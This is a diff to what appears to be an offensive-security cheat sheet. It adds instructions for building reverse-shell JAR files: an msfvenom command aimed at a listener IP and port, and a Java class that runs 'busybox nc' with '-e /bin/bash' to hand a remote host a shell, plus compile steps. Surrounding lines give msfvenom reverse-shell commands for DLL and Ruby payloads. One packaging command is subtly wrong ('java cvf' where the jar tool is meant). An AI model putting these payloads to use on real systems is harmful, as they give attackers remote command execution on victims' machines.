@@ -103,6 +103,53 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 msfvenom --platform ruby -p ruby/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -o payload.rb
 ```
 
+#### ➤ .JAR
+
+Using msfvenom
+```
+msfvenom -p java/shell_reverse_tcp LHOST=192.168.5.128 LPORT=1234  -f jar > rev.jar
+```
+
+Manually
+```
+Step 1. Create a shell.java code
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class shell {
+	public static void main(String[] args) {
+		String command = "busybox nc 192.168.49.57 443 -e /bin/bash";
+		try {
+			//Execute the command
+			Process process = Runtime.getRuntime().exec(command);
+
+			//Read output (similar to ProcessBuilder example)
+			BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+			String line;
+			StringBuilder output = new StringBuilder();
+			while ((line = reader.readLine()) != null) {
+				output.append(line).append("\n");
+			}
+
+			int exitCode = process.waitFor();
+			System.out.println("Command executed with exit code: " + exitCode);
+			System.out.println("Output:\n" + output.toString());
+
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
+}
+
+Step 2. Compilation
+
+javac -d ./build *.java
+cd build
+java cvf shell.jar *
+```
+
+
 #### ➤ .SO
 
 reference : 
